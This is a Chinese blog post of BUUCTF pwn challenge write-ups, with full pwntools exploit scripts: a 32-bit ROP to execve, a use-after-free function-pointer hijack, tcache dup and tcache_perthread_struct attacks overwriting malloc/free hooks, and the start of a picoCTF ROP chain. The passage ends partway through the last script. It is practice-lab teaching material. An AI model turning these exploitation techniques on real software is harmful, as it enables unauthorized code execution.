

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content>
  <meta name="author" content="chumen77">
  <meta name="keywords" content>
  <title>BUUCTF暑假刷题(1) - Chumen77&#39;s Blog</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">


  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
  <link rel="stylesheet" href="/lib/hint/hint.min.css">

  
    
    
      
      <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/atom-one-dark.min.css">
    
  

  


<!-- 主题依赖的图标库，不要自行修改 -->
<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">

<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">

<link rel="stylesheet" href="/css/main.css">

<!-- 自定义样式保持在最底部 -->


  <script src="/js/utils.js"></script>
  <script src="/js/color-schema.js"></script>
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Chumen77's Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2020-07-10 21:16" pubdate>
        2020年7月10日 晚上
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      11.8k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      199
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">BUUCTF暑假刷题(1)</h1>
            
            <div class="markdown-body" id="post-body">
              <h1 id="BUUCTF暑假刷题-1"><a href="#BUUCTF暑假刷题-1" class="headerlink" title="BUUCTF暑假刷题(1)"></a>BUUCTF暑假刷题(1)</h1><h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a><code>cmcc_simplerop</code></h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>静态链接。32位程序。用<code>int 80h</code> 这个中断调用，呼叫系统调用程序<code>system_call()</code>.。</p>
<p>然后rop 控制EAX = 0Xb = 11，EBX = &amp;(“/bin/sh”), ECX = EDX = 0，即执行了<code>sys_execve(&quot;/bin/sh&quot;, 0, 0, 0)</code>，即可拿到shell。</p>
<p>32位系统调用表：<a href="https://blog.csdn.net/xiaominthere/article/details/17287965" target="_blank" rel="noopener">https://blog.csdn.net/xiaominthere/article/details/17287965</a></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./simplerop'</span>
local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = ELF(local_libc)
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29124</span>)
    libc = ELF(remote_libc)
elf = ELF(local_file)
libc = elf.libc
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]
realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]
arae18 = <span class="hljs-number">0x3ebca0</span>
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

offset = <span class="hljs-number">32</span>
start = <span class="hljs-number">0x8048E45</span>
read = <span class="hljs-number">0x806CD50</span>
pop_eax_ret = <span class="hljs-number">0x080bae06</span>
pop_ebx_ret = <span class="hljs-number">0x080481c9</span>
pop_ecx_ebx_ret = <span class="hljs-number">0x0806e851</span>
pop_edx_ret = <span class="hljs-number">0x0806e82a</span>
pop3_ret = <span class="hljs-number">0x08048913</span>
bss = <span class="hljs-number">0x80EC2EC</span> - <span class="hljs-number">0x10</span>
ret = <span class="hljs-number">0x8048E6F</span>
in_t_0x80 = <span class="hljs-number">0x080493e1</span>
payload = <span class="hljs-string">'a'</span> * offset + flat([read,pop3_ret,<span class="hljs-number">0</span>,bss,<span class="hljs-number">0x8</span>])
payload += flat([pop_eax_ret,<span class="hljs-number">11</span>,pop_ecx_ebx_ret,<span class="hljs-number">0</span>,bss,pop_edx_ret,<span class="hljs-number">0</span>,in_t_0x80])
sa(<span class="hljs-string">':'</span>,payload)
s(<span class="hljs-string">'/bin/sh\x00'</span>)
itr()</code></pre></div>

<p>其中rop链read后返回地址：<code>pop3_ret</code>，是为了pop <code>0,bss,0x8</code>，然后再跟着rop。</p>
<h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a><code>ciscn_2019_n_3</code></h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>Ubuntu 18 ,存在UAF漏洞。</p>
<div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">rec_str_free</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span>
</span>&#123;
  <span class="hljs-built_in">free</span>(*((<span class="hljs-keyword">void</span> **)ptr + <span class="hljs-number">2</span>));
  <span class="hljs-built_in">free</span>(ptr);
  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Note freed!"</span>);
&#125;</code></pre></div>

<p>每创建一个堆，就有一个0x10的堆空间，存放函数指针。一看到这个，就可以说是暗示攻击这个地方来劫持程序流程。</p>
<div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">do_del</span><span class="hljs-params">()</span>
</span>&#123;
  <span class="hljs-keyword">int</span> v0; <span class="hljs-comment">// eax</span>

  v0 = ask((<span class="hljs-keyword">int</span>)<span class="hljs-string">"Index"</span>);
  <span class="hljs-keyword">return</span> (*(<span class="hljs-keyword">int</span> (__cdecl **)(<span class="hljs-keyword">int</span>))(records[v0] + <span class="hljs-number">4</span>))(records[v0]);
&#125;</code></pre></div>

<p>利用这个函数来劫持程序流程。<br>先<code>new(0,2,0x40,payload)</code>看一下程序的内存情况, 对于其中的<code>(*(int (__cdecl **)(int))(records[v0] + 4))(records[v0])</code> ：</p>
<div class="hljs"><pre><code class="hljs c">gef➤  p &amp;records
$<span class="hljs-number">1</span> = (&lt;data variable, no debug info&gt; *) <span class="hljs-number">0x804b080</span> &lt;records&gt;
gef➤  x/wx <span class="hljs-number">0x804b080</span>
<span class="hljs-number">0x804b080</span> &lt;records&gt;:    <span class="hljs-number">0x08635160</span>
gef➤  x/wx <span class="hljs-number">0x08635160</span>
<span class="hljs-number">0x8635160</span>:      <span class="hljs-number">0x080486de</span></code></pre></div>

<p>所以 <code>records[v0]</code>  = 0x08635160 </p>
<div class="hljs"><pre><code class="hljs c">gef➤  x/wx <span class="hljs-number">0x08635160</span>+<span class="hljs-number">4</span>
<span class="hljs-number">0x8635164</span>:      <span class="hljs-number">0x08048725</span>
gef➤  x/i <span class="hljs-number">0x08048725</span>
   <span class="hljs-number">0x8048725</span> &lt;rec_str_free&gt;:    push   ebp</code></pre></div>

<p>所以 <code>*(int (__cdecl **)(int))(records[v0] + 4))</code>  = <code>0x8048725 &lt;rec_str_free&gt;:</code></p>
<p>且<br><img src="http://qiqianyun.chumen77.xyz/uPic/VT03Ns.png" srcset="/img/loading.gif" alt><br>如图，把这里的函数指针控制成<code>sh\x00\00</code> + <code>&amp;system</code> ,即执行<code>do_del</code>时，运行的就是<code>system(sh)</code>可拿到shell。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./ciscn_2019_n_3'</span>
local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = ELF(local_libc)
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26453</span>)
    libc = ELF(remote_libc)
elf = ELF(local_file)
libc = elf.libc
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]
realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]
arae18 = <span class="hljs-number">0x3ebca0</span>
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span><span class="hljs-params">(id,type,len,context)</span>:</span>
    sla(<span class="hljs-string">"CNote &gt;"</span>,<span class="hljs-string">'1'</span>)
    sla(<span class="hljs-string">"dex &gt;"</span>,str(id))
    sla(<span class="hljs-string">"Type &gt;"</span>,str(type))
    sla(<span class="hljs-string">"th &gt;"</span>,str(len))
    sa(<span class="hljs-string">"ue &gt;"</span>,str(context))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(id)</span>:</span>
    sla(<span class="hljs-string">"CNote &gt;"</span>,<span class="hljs-string">'2'</span>)
    sla(<span class="hljs-string">"dex &gt;"</span>,str(id))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(id)</span>:</span>
    sla(<span class="hljs-string">"CNote &gt;"</span>,<span class="hljs-string">'3'</span>)
    sla(<span class="hljs-string">"dex &gt;"</span>,str(id))

payload = <span class="hljs-string">"a"</span> + <span class="hljs-string">'\n'</span>
new(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x40</span>,payload)
new(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x40</span>,payload)
free(<span class="hljs-number">1</span>)
free(<span class="hljs-number">0</span>)
system = elf.plt[<span class="hljs-string">'system'</span>]
new(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x9</span>,<span class="hljs-string">'sh\x00\x00'</span>+ p32(system))
free(<span class="hljs-number">1</span>)
itr()</code></pre></div>

<h4 id="无system函数情况下"><a href="#无system函数情况下" class="headerlink" title="无system函数情况下"></a>无system函数情况下</h4><p>Leak libc，还是攻击那一个函数指针，本地通远程没通。</p>
<p>在测试的时候，由于fgets总是在你传入的字符串后加上<code>\x00</code>，曾经就遇到<br>过，导致泄漏十分难进行，但是发现：</p>
<div class="hljs"><pre><code class="hljs python">payload = <span class="hljs-string">''</span>
new(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x0</span>,payload)
ru(<span class="hljs-string">"lue="</span>)
libc_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x1d89d8</span></code></pre></div>

<p>传入空字节竟然可以通过，且没有加上<code>\x00</code>，从而不影响泄漏libc。还不知道是否以后遇到fgets函数就可以这样处理其影响，先挖个坑，记录着。</p>
<div class="hljs"><pre><code class="hljs python">payload = <span class="hljs-string">'a'</span> + <span class="hljs-string">'\n'</span>
new(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x400</span>,payload)
new(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x400</span>,payload)
free(<span class="hljs-number">0</span>)
payload = <span class="hljs-string">''</span>
new(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x0</span>,payload)
ru(<span class="hljs-string">"lue="</span>)
libc_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x1d89d8</span>
info_addr(<span class="hljs-string">"libc_base"</span>,libc_base)
payload = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">4</span> + <span class="hljs-string">'/bin/sh\x00'</span> +<span class="hljs-string">'\n'</span>
new(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x400</span><span class="hljs-number">-0x10</span><span class="hljs-number">-0x10</span>,payload)
new(<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x40</span>,payload)
new(<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x40</span>,payload)
free(<span class="hljs-number">5</span>)
free(<span class="hljs-number">4</span>)
rec = libc_base + <span class="hljs-number">0x3d123</span>
new(<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x9</span>,p32(rec) + p32(rec))
<span class="hljs-comment"># free(5)</span>
show(<span class="hljs-number">5</span>)
<span class="hljs-comment"># debug()</span>
itr()</code></pre></div>

<h2 id="V-amp-N2020easyTHeap"><a href="#V-amp-N2020easyTHeap" class="headerlink" title="V&amp;N2020easyTHeap"></a>V&amp;N2020easyTHeap</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>Ubuntu 18 ,存在UAF漏洞，tcache dup攻击。</p>
<p>考点：</p>
<ul>
<li>攻击<code>tcache_perthread_struct</code>，伪造tcache已经满了</li>
<li>攻击<code>tcache_entry</code>，在指定的位置写上目标地址，在申请一个对应大小的堆，即可实现任意地址写入。<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3></li>
</ul>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./vn_pwn_easyTHeap'</span>
local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc-2.27.so'</span>
remote_libc = <span class="hljs-string">'./libc-2.27.so'</span>
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">1</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = ELF(local_libc)
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25814</span>)
    libc = ELF(remote_libc)
elf = ELF(local_file)
<span class="hljs-comment"># libc = elf.libc</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]
realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]
arae18 = <span class="hljs-number">0x3ebca0</span>
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>
    sla(<span class="hljs-string">"choice"</span>,<span class="hljs-string">'1'</span>)
    sla(<span class="hljs-string">"?"</span>,str(size))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,context)</span>:</span>
    sla(<span class="hljs-string">"choice"</span>,<span class="hljs-string">'2'</span>)
    sla(<span class="hljs-string">'idx'</span>,str(idx))
    sa(<span class="hljs-string">'content'</span>,str(context))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)
    sla(<span class="hljs-string">'idx'</span>,str(idx))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'4'</span>)
    sla(<span class="hljs-string">"idx"</span>,str(idx))

add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#0</span>
add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#1</span>
free(<span class="hljs-number">0</span>)
free(<span class="hljs-number">0</span>)
show(<span class="hljs-number">0</span>)
r()
heapbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x260</span>
info_addr(<span class="hljs-string">'heapbase'</span>,heapbase)
add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#2</span>
edit(<span class="hljs-number">2</span>,p64(heapbase+<span class="hljs-number">0x10</span>))
add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#3</span>
add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#4</span>
edit(<span class="hljs-number">4</span>,<span class="hljs-string">'\x07'</span>*<span class="hljs-number">0x10</span>)
free(<span class="hljs-number">0</span>)
show(<span class="hljs-number">0</span>)
r()
libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebca0</span>
info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)
__malloc_hook = libc_base + <span class="hljs-number">0x3ebc30</span>
__realloc_hook = __malloc_hook <span class="hljs-number">-0x8</span>
payload = <span class="hljs-string">'\x00'</span> * (<span class="hljs-number">8</span>+<span class="hljs-number">7</span>) + <span class="hljs-string">'\x01'</span> + <span class="hljs-string">'\x00'</span> * (<span class="hljs-number">0x80</span> - <span class="hljs-number">8</span> - <span class="hljs-number">8</span>) + <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x38</span> + p64(__realloc_hook)
edit(<span class="hljs-number">4</span>,payload)
add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#5</span>
onerec = <span class="hljs-number">0x10a38c</span> + libc_base
realloc_addr = libc_base + libc.symbols[<span class="hljs-string">'__libc_realloc'</span>]
info_addr(<span class="hljs-string">'relloc'</span>,realloc_addr)
info_addr(<span class="hljs-string">'__malloc_hook'</span>,__malloc_hook)
payload = p64(onerec) + p64(realloc_addr+<span class="hljs-number">8</span>)
edit(<span class="hljs-number">5</span>,payload)
add(<span class="hljs-number">0x100</span>)
<span class="hljs-comment">#debug()</span>
itr()</code></pre></div>

<h2 id="ciscn-2019-final-3"><a href="#ciscn-2019-final-3" class="headerlink" title="ciscn_2019_final_3"></a><code>ciscn_2019_final_3</code></h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>Ubuntu 18，保护全开，存在uaf漏洞。</p>
<p>程序只有增加和删除的功能，但是增加一个堆块后回给你返回申请堆块的地址信息。</p>
<div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"gift :%p\n"</span>, heaplist[HIDWORD(size)]);</code></pre></div>

<p>删除堆后，没有置0的操作，存在uaf。</p>
<p>考点：</p>
<ul>
<li>攻击<code>tcache_perthread_struct</code>，伪造tcache已经满了</li>
<li>攻击<code>tcache_entry</code>，在指定的位置写上目标地址，在申请一个对应大小的堆，即可实现任意地址写入。</li>
</ul>
<p>难点：</p>
<ul>
<li>泄漏libc地址</li>
<li>精巧的构造一个任意地址写（在<code>tcache struct</code>处折腾）</li>
</ul>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs c">from pwn import *
import time
local_file  = './ciscn_final_3'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # './libc.so.6'
context.log_level = 'debug'
debug = 1
if debug:
    io = process(local_file)
    libc = ELF(local_libc)
else:
    io = remote('node3.buuoj.cn',27714)
    libc = ELF(remote_libc)
elf = ELF(local_file)
context.arch = elf.arch
context.terminal = ['tmux','neww']
rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
rce18 = []
realloc = [0x2,0x4,0x6,0xB,0xC,0xD]
arae18 = 0x3ebca0
s      = lambda data               :io.send(data) 
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
sea     = lambda delim,data         :io.sendafter(delim, data)
r      = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr))
itr     = lambda                    :io.interactive()
def debug():
    # gdb.attach(proc.pidof(io)[0],gdbscript='b main')
    gdb.attach(io)
    pause()

def add(idx,size,content):
    sla("&gt;",'1')
    sla('index',str(idx))
    sla('size',str(size))
    sa('thing',str(content))
    ru("0x")
    gift = int(r(12),16)
    info_addr('gift',gift)
    return gift
def free(idx):
    sla("&gt;",'2')
    sla("index",str(idx))

heap_base = add(0,0x48,'a') - 0x11e70
free(0)
free(0)
add(1,0x48,p64(heap_base+0x10))
add(2,0x48,p64(heap_base+0x10))
payload = 0x30 * '\x07'
add(3,0x48,payload)
free(3)
payload = 0x30 * '\x00'
add(4,0x48,payload)
add(5,0x10,' ')
libc_base = add(6,0x78,' ') - 0x3ebca0
info_addr('libc_base',libc_base)
free_hook = libc_base + 0x3ed8e8
free(5)
add(7,0x10,p64(free_hook)*2)
one_rec = 0x4f322 + libc_base
add(8,0x48,p64(one_rec))
# debug()
free(4)
itr()</code></pre></div>

<p>调试一下就懂了。其中0x10那个堆块的申请很重要，正好可以供后面的使用。</p>
<h2 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a><code>picoctf_2018_rop chain</code></h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>只是一个简单的rop，考的就是32位下如何控制传参数。</p>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./PicoCTF_2018_rop_chain'</span>
local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = ELF(local_libc)
<span class="hljs-keyword">else</span>:
